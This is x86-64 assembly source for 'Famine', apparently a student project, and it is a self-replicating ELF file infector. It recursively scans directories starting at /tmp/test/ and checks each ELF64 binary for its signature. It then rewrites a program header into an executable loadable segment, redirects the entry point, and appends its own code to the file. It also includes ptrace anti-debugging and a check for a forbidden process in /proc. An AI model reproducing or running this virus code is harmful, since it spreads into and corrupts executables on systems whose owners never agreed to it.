%include "src/famine.inc"

BITS 64
default rel

section .text
	global _start

; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	PUSH_ALL
	jmp		end_

print_rax:

    PUSH_ALL
    ; Utilisation d’un buffer sur la pile
    sub     rsp, 64             ; réserver 32 bytes
    lea     rsi, [rsp + 64]     ; rsi = fin du buffer
    mov     rcx, 0              ; compteur de caractères
    mov     rbx, rax            ; backup rax dans rbx

.convert:
    xor     rdx, rdx
    mov     rax, rbx
    mov     rdi, 10
    div     rdi                ; rax = rbx / 10, rdx = reste
    dec     rsi
    add     dl, '0'
    mov     [rsi], dl
    mov     rbx, rax
    inc     rcx
    test    rax, rax
    jnz     .convert

    ; Affichage
    mov     rax, 1              ; syscall write
    mov     rdi, 1              ; stdout
    mov     rdx, rcx            ; taille
    syscall


	mov		rax, SYS_write
	mov		rdi, 1
	lea		rsi, [rel newl]
	mov		rdx, 1
	syscall

    add     rsp, 64             ; restaurer la pile
    POP_ALL
    ret

	;   rax = ((value - (base % 0x1000) + 0x0FFF) & ~0x0FFF) + (base % 0x1000)
	align_value:	; rax = value, rdx = base
		; sauvegarder base % 0x1000 dans rcx
		PUSH_ALLr
		and		rdx, 0xFFF        ; rcx = base % 0x1000
		sub		rax, rdx          ; rax = value - (base % 0x1000)
		add		rax, 0x0FFF       ; rax += 0x0FFF
		and		rax, ~0x0FFF      ; rax = align up to next page
		add		rax, rdx          ; rax += (base % 0x1000)
		POP_ALLr
	ret



	printf: ; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		xor		rdx, rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			sub		rsi, rdx
			mov		rax, SYS_write
			mov		rdi, 1
			syscall
			mov		rax, SYS_write
			mov		rdi, 1
			lea		rsi, [rel newl]
			mov		rdx, 1
			syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	sub_val:	; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			cmp		rdx, 3
			jle		.finish
			std		 ; sens inverse pour lodsb
			mov		[rsi - 2], byte 0
			.second_loop:
				lodsb
				cmp		al, '/'
				je		.second_done
				mov		[rsi + 1], byte 0
				jmp		.second_loop
			.second_done:
			cld
		.finish:
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	add_val:	; lea rsi [le path], lea rdi val ajoutee
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		push	r12

		mov		r12, rax
		xor		rcx, rcx
		xor		rdx, rdx
		.loop:
			lodsb
			test	al, al
			je		.done
			inc		rdx
			jmp		.loop
		.done:
			dec		rsi
			xchg	rsi, rdi
			.second_loop:
				lodsb
				inc		rcx
				test	al, al
				je		.second_done
				jmp		.second_loop
			.second_done:
				sub		rsi, rcx
				mov		rax, rcx
				rep		movsb
				xchg	rsi, rdi

				cmp		r12, 4
				jne		.file
				mov		[rsi - 1], byte '/'
				mov		[rsi], byte 0
				.file:
				sub		rsi, rax
				sub		rsi, rdx
		pop		r12
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	famine:
		push	r12
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx

		lea		rsi, [rel path]
		call	printf
		lea		rdi, [rel buff]
		mov		rcx, 512
		xor		rax, rax
		rep		stosq

		mov		rax, SYS_openat
		mov		rdi, AT_FDCWD
		lea		rsi, [rel path]
		xor		rdx, rdx
		xor		r10, r10
		syscall
		mov		r12, rax
		mov		rdi, rax
		push	rdi

	;SYS_getdents64
	;struct linux_dirent64 {
    ;ino64_t        d_ino;     // 8 bytes : numéro d'inode
    ;off64_t        d_off;     // 8 bytes : offset du prochain dirent
    ;unsigned short d_reclen;  // 2 bytes : taille de cette entrée
    ;unsigned char  d_type;    // 1 byte  : type de fichier
    ;char           d_name[];  // nom du fichier (null-terminated)
	;};

		mov		rax, SYS_getdents64
		lea		rsi, [rel buff]
		mov		rdx, 4096
		syscall
		mov		rdx, rax
		xor		rdi, rdi
		.loop:
			cmp		rdx, rdi
			jle		.done

			add		rdi, 16
			push	rbx
			lea		rbx, [rel buff]
			movzx	rcx, word [rbx + rdi]
			add		rdi, 2
			movzx	rax, byte [rbx + rdi]
			pop		rbx
			add		rdi, 1
			sub		rcx, 19
			add		rdi, rcx
			add		rsi, 19

			cmp		rax, 4
			jne		.file
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 2
			lea		rdi, [rel curr]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 3
			lea		rdi, [rel last]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			; Ici seulement les files


			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi


			call	famine

			push	rsi
			lea		rsi, [rel path]
			call	sub_val
			pop		rsi

			push	rax
			push	rcx
			push	rsi
			push	rdi
			push	rdx
			lea		rdi, [rel buff]
			mov		rcx, 512
			xor		rax, rax
			rep		stosq

			mov		rax, SYS_close
			mov		rdi, r12
			syscall

			mov		rax, SYS_openat
			mov		rdi, AT_FDCWD
			lea		rsi, [rel path]
			xor		rdx, rdx
			xor		r10, r10
			syscall

			mov		rdi, rax
			mov		rax, SYS_getdents64
			lea		rsi, [rel buff]
			mov		rdx, 4096
			syscall
			pop		rdx
			pop		rdi
			pop		rsi
			pop		rcx
			pop		rax

			jmp		.no_print
		.file:
			;call	printf ;logique des fichier

			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi

			;call	printf

			call	check_binary
			; jz .no_print

			; call infection_0
			; ici logique des fichier
		.no_print:
			add		rsi, rcx
			jmp		.loop
		.done:

		pop		rdi
		mov		rax, SYS_close
		syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
		pop		r12
	ret
		; elfp0
		;movzx	rcx, e_phnum
		;movzx	rdi, e_phentisize

	check_binary:
		PUSH_ALL
	
		; open(path, O_RDWR)
		mov     rax, SYS_open
		lea     rdi, [rel path]
		mov     rsi, 2 ; O_RDWR
		xor     rdx, rdx
		syscall
		cmp     rax, 0
		jl      .ret
		mov     r12, rax ; save fd
	
		; fstat(fd, &stat)
		mov     rdi, r12
		sub     rsp, 144 ; struct stat buffer
		mov     rax, SYS_fstat
		mov     rsi, rsp
		syscall
		cmp     rax, 0
		jl      .ret_restore
	
		; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
		mov     rsi, [rsp + 48]
		mov     rax, SYS_mmap
		mov     rdi, 0
		mov     rdx, PROT_READ | PROT_WRITE
		mov     r10, MAP_SHARED
		mov     r8, r12
		mov     r9, 0
		syscall
		cmp     rax, -4095
		jae     .ret_restore

		; check is elf
		cmp dword [rax], 0x464c457f
		jne .ret_restore

		; check is elf64
		cmp byte [rax + 0x4], 0x2
		jne .ret_restore

		; check for signature
		; signature = file_start + padding - (end - signature)
		mov rdx, [rsp + 48]
		mov rdi, rax
		add rdi, rdx
		sub rdi, (end_addr - signature)

		xor rax, rax
		mov rsi, signature
		call ft_strcmp
		cmp eax, 0
		je .ret_restore

		call infection_0
	.ret_restore:
		add     rsp, 144
	.ret:
		POP_ALL
		ret
		

	infection_0:
		PUSH_ALLr

		mov		BYTE [rel zero], 1
		mov		qword [rel p_offset], 0
		mov		qword [rel p_vaddr], 0
		mov		qword [rel p_paddr], 0

		mov		qword [rel p_offset],  0

		mov		r10, 64 ; offset in file!
		xor		r15, r15	; gap
		xor		r11, r11
		mov		r13, 1
	.loop:
		push	r11
		push	rcx
		mov		rax, SYS_read
		mov		rdi, r12
		lea		rsi, [rel elfp0]
		mov		rdx, 56
		syscall
		pop		rcx
		pop		r11
		add		r10, 56
		cmp		rax, 56
		jne		.return

		cmp		dword [rel elfp0], 1
		jne		.no_load

		mov		rax, [rel elfp0 + phdr.p_filesz]
		add		rax, [rel elfp0 + phdr.p_offset]
		cmp		rax,  [rel p_offset]
		jb		.no_above
		mov		[rel p_offset], rax
	.no_above_offset:
		mov		rax, [rel elfp0 + phdr.p_vaddr]
		add		rax, [rel elfp0 + phdr.p_memsz]
		cmp		rax,  [rel p_vaddr]
		jb		.no_above
		mov		[rel p_vaddr], rax
	.no_above:
		cmp		dword [rel elfp0 + phdr.p_flags], 6
		jnle	.no_load
		mov		r15, [rel elfp0 + phdr.p_vaddr]
		sub		r15, [rel elfp0 + phdr.p_offset]

	.no_load:
		cmp		dword [rel elfp0], 0
		je		.usseles_ph
		cmp		dword [rel elfp0], 4
		je		.usseles_ph
		cmp		dword [rel elfp0], 5
		je		.usseles_ph
		jmp		.not_usseles_ph
	.usseles_ph:
		mov		r11, r10
		xor		r13, r13
	.not_usseles_ph:
	dec	rcx
	jnz	.loop
		cmp		r13, 1
		je		.return

		mov		rax, [rel p_vaddr]
		;add		rax, [rel elfb + ehdr.e_shoff]
		;add		rax, r15	-> Tant que ca crash pas on add pas!

		mov		rdx, [rel p_offset]

		call	align_value

		mov		[rel p_vaddr], rax
		mov		[rel entry], rax
		mov		[rel p_paddr], rax

		sub		r11, 56;

		mov		rax, SYS_pwrite64
		mov		rdi, r12
		lea		rsi, [rel new_programheader]
		mov		rdx, 56
		mov		r10, r11
		syscall

		;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
		; New Entry
		mov		rax, SYS_pwrite64
		mov		rdi, r12
		lea		rsi, [rel p_vaddr]
		mov		rdx, 8
		mov		r10, ehdr.e_entry
		syscall

		mov		rax, SYS_pwrite64
		mov		rdi, r12
		lea		rsi, [rel one]
		mov		rdx, 1
		mov		r10, 0xa
		syscall

		; write famine
		; 15952 ->21088
		lea		rsi, [rel _start]
		mov		rdx, FAMINE_SIZE_NO_BSS
		mov		r10, [rel p_offset]
		mov		rdi, r12
		mov		rax, SYS_pwrite64
		syscall


	.return:

		mov		rax, r13
		POP_ALLr
	ret

end_:
	; check if tracer
	; call _is_debugged
	; test rax, rax
	; jz .just_quit

	; check active forbidden process
	call _check_forbidden_process
	test rax, rax
	jz .just_quit

	mov		rax, [rel entry]
	mov		[rel new_entry], rax

	mov		rax, [rel new_entry]
	sub		rax, [rel old_entry]
	lea		rdi, [rel _start]
	sub		rdi, rax

	mov		[rel new_entry], rdi

	call	famine

	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	xor		rdx, rdx
	syscall
	cmp		rax, 0
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall


	mov		rax, SYS_close
	mov		rdi, r12
	syscall

	.just_quit:
		POP_ALL
		mov		al, BYTE [rel zero]
		test	al, al
		jz		.exit_ret

		jmp		[rel new_entry]

	.exit_ret:
		mov		rax, SYS_exit
		xor		rdi, rdi
		syscall

; Anti debug ---
_is_debugged:
	mov rdi, 0
	mov rax, SYS_ptrace
	xor rsi, rsi
	xor rdx, rdx
	xor r10, r10
	syscall
	ret

; Check forbidden process ---
_check_forbidden_process:
	mov rax, SYS_open
	lea rdi, [rel proc_path]
	xor rsi, rsi
	xor rdx, rdx
	syscall
	cmp rax, 0
	jl .ret

	mov r12, rax

.read_dir:
	mov rax, SYS_getdents64
	lea rdi, r12
	lea rsi, [rel buff]
	mov rdx, 4096
	syscall
	cmp rax, 0
	jl .close_getdents

	mov r12, rax
	xor r13, r13

.read_getdents_entry:
	cmp r10, r13
	jle .close_getdents

	xor r10, r10
	lea rdi, [rel buff]
	add rdi, r13
    movzx	r10, word [rdi + 16]        ; d_reclen
    xor     rax, rax
   	mov	    al,  byte [rdi + r10 - 1]   ; file type
    lea     rsi, [rdi  + 18]            ; address of d_name field
    add     r13, r10
    cmp     al,  DT_DIR
    jne     .read_getdents_entry
    push    r15
    jmp    .parse_dir

.loop:
	xor r15, r15
	pop r15
	jmp .read_getdents_entry

.close_getdents:
	mov rax, SYS_close
	mov rdi, r12
	syscall

.ret:
	mov rax, 0
	ret

; parse process dir ---
.parse_dir:
	mov rdi, r15
	lea rdx, [rel proc_path]

.dirname:
	mov     al, byte [rdi]
	test    al, al
	jz      .filename
	mov     byte [rdx], al
	inc     rdi
	inc     rdx
	jmp     .dirname
	
.filename:
	mov     al, byte [rsi]
	test    al, al
	jz      .find_process_name
	mov     byte [rdx], al
	inc     rsi
	inc     rdx
	jmp     .dirname

.find_process_name:
	lea rsi, [rel comm_path]

.concat_comm_path:
	mov al, byte [rsi]
	test al, al
	jz .open_comm
	mov byte [rdx], al
	inc rsi
	inc rdx
	jmp .concat_comm_path

.open_comm:
	mov rax, SYS_open
	lea rdi, [rel comm_path]
	xor rsi, rsi
	xor rdx, rdx
	syscall
	cmp rax, 0
	jz .loop

.check_comm_name:
	mov r14, rax    ; save fd
	
	; read process name from /proc/PID/comm
	mov rax, SYS_read
	mov rdi, r14
	lea rsi, [rel padd]  ; use padd buffer to store process name
	mov rdx, 16          ; comm names are max 15 chars + newline
	syscall
	cmp rax, 0
	jle .close_file
	
	; remove newline if present
	lea rdi, [rel padd]
	mov rcx, rax
	dec rcx
	add rdi, rcx
	cmp byte [rdi], 0xa  ; check if last char is newline
	jne .no_newline
	mov byte [rdi], 0    ; replace newline with null terminator
.no_newline:
	
	; compare with forbidden processes
	lea rdi, [rel padd]
	lea rsi, [rel forbidden_process]
	call ft_strcmp
	cmp eax, 0
	je .forbidden_found  ; if equal, forbidden process found
	
	; you can add more forbidden processes here by checking against other strings
	
	jmp .close_file

.forbidden_found:
	; close current file
	mov rax, SYS_close
	mov rdi, r14
	syscall
	
	; close directory
	mov rax, SYS_close
	mov rdi, r12
	syscall
	
	; return 1 to indicate forbidden process found
	mov rax, 1
	ret

.close_file:
	mov rdi, r14  ; use saved fd instead of rax
	mov rax, SYS_close
	syscall
	jmp .loop


; Utils ---
ft_strcmp:
	PUSH_ALL
	xor eax, eax
	.loop:
		mov al, [rdi]
		mov dl, [rsi]
		cmp al, dl
		jne .diff
		test al, al
		je .done
		inc rdi
		inc rsi
		jmp .loop
	.diff:
		sub eax, edx
	.done:
		POP_ALL
		ret

; -----

	elfb	times 0064 db 0
	file	db 'elf64 found!', 0
	signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
	old_entry		   dq 0
	new_entry		   dq 0
	self	db '/proc/self/exe', 0
	last	db '..', 0
	curr	db '.', 0
	elfh	db 0x7f, 'ELF'
	one		db 1
	zero	db 0
	paddi	dq 0
	entry	dq 0
	exec	dd 7

	; forbidden process
	proc_path db '/proc/', 0
	comm_path db '/comm', 0
	forbidden_process:
		db 'sdfsdfsdfsdfdsfsdf', 0

; NEW HEADER
new_programheader:
	elfp0	times 0056 db 0
	elfp1	times 0056 db 0
	p_type		dd	1
	p_flags		dd	7
	p_offset	dq	0
	p_vaddr		dq	0
	p_paddr		dq	0
	p_filez		dq	FAMINE_SIZE_NO_BSS
	p_memsz		dq	FAMINE_SIZE
	p_palign	dq	4096
	newl	times 0001 db 0xa
	path	db '/tmp/test/', 0
buffer_bss:
	padd	times 0512 db 0
	buff	times 4096 db 0

end_addr:
